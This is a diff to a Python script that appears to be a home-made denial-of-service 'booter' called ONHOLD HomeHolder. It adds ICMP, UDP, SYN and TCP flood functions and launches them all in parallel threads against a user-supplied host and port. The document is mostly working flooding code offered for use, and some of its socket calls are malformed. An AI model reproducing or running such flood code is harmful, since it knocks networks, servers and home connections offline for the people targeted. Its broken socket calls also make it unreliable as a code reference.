@@ -1,5 +1,6 @@
 #!/usr/bin/env python3
 #-*- coding: utf-8 -*-
+#ONHOLD / Made By D3fe4ted / Github.com
 
 #lib
 import sys, socket, time, requests, random, threading, getpass, os
@@ -54,6 +55,65 @@ def onholdsender(host, port, timer, punch):
 	uaid -= 1
 	aid -= 1
 
+def onholdicmp(host, port, timer, bytes):
+    global atks
+    global running
+    timeout = time.time() + float(timer)
+    sock = socket.socket(socket.AF_INET, socket.IPPROTO_IGMP)
+    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+    atks += 1
+    running += 1
+    while time.time() < timeout and attack:
+        sock.sendto(bytes, (host, int(port)))
+    atks -= 1
+    running -= 1
+
+def onholdudp(host, port, timer, bytes):
+    global atks
+    global running
+    timeout = time.time() + float(timer)
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+    atks += 1
+    running += 1
+    while time.time() < timeout and attack:
+        sock.sendto(bytes, (host, int(port)))
+    atks -= 1
+    running -= 1 
+
+def onholdsyn(host, port, timer, punch):
+	global said
+	global syn
+	global aid
+	global tattacks
+	timeout = time.time() + float(timer)
+	sock = socket.socket (socket.AF_INET, socket.SOCK_RAW, socket.TCP_SYNCNT)
+
+	said += 1
+	tattacks += 1
+	aid += 1
+	while time.time() < timeout and syn and attack:
+		sock.sendto(punch, (host, int(port)))
+	said -= 1
+	aid -= 1
+
+def onholdtcp(host, port, timer, bytes):
+    global atks
+    global running
+    timeout = time.time() + float(timer)
+    atks += 1
+    running += 1
+    while time.time() < timeout and attack:
+        try:
+            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_TCP, 17)
+            sock.sendto(bytes, (host, int(port)))
+            sock.close()
+        except socket.error:
+            pass
+            
+    atks -= 1
+    running -= 1
+
 #globals
 def main():
 	global fsubs
@@ -69,7 +129,8 @@ def main():
 	global ovh
 	global gamenuke
 	global http
-
+	
+	#commandline
 	while True:
 		sys.stdout.write("\x1b]2;LIVE: ONHOLD HomeHolder | By @d3fe4ted, ENJOY! \x07")
 		sin = input("\033[32muser\033[37m@\033[31monh\033[37mold~ ").lower()
@@ -95,6 +156,10 @@ def main():
 				print ("\033[31m[ONH\033[37mOLD] Attack sent from OnHold Client to {}".format (host))
 				punch = random._urandom(int(pack))
 				threading.Thread(target=onholdsender, args=(host, port, timer, punch)).start()
+				threading.Thread(target=onholdicmp, args=(host, port, timer, punch)).start()
+				threading.Thread(target=onholdudp, args=(host, port, timer, punch)).start()
+				threading.Thread(target=onholdsyn, args=(host, port, timer, punch)).start()
+				threading.Thread(target=onholdtcp, args=(host, port, timer, punch)).start()
 			except ValueError:
 				print ("\033[31m[ONH\033[37mOLD] The Command {} Requires An Argument.\n".format (sinput))
 				main()
